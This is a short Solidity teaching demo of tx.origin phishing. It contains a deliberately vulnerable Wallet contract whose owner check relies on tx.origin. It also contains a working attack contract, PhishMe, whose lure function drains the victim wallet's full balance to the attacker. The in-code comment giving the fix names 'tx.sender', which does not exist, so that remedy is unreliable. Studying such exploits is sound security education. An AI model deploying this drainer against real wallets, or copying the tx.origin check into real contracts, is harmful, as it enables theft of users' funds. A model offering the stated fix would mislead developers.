// SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function deposit() public payable {}

    function transfer(address _to, uint _amount) public payable {
        //Here is vuln
        //It should be : tx.sender == owner
        require(tx.origin == owner, "Only owner can send ether");

        (bool result, ) = _to.call{value: _amount}("");
        require(result, "Failed to send Ether");
    }

    function checkBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract PhishMe {
    address private maliciousOwner;
    Wallet wallet;

    constructor(address _walletAddr) {
        maliciousOwner = msg.sender;
        wallet = Wallet(_walletAddr);
    }

    function greatOportunity() external returns (string memory) {
        // (bool result, bytes memory data) = wallet.call(
        //     abi.encodeWithSignature("checkBalance()"));
        uint yourBalanceYouMorronPlease = wallet.checkBalance();
        wallet.transfer(maliciousOwner, yourBalanceYouMorronPlease);
        return "Your dreams gonna become true. Just be patient :)";
    }
}
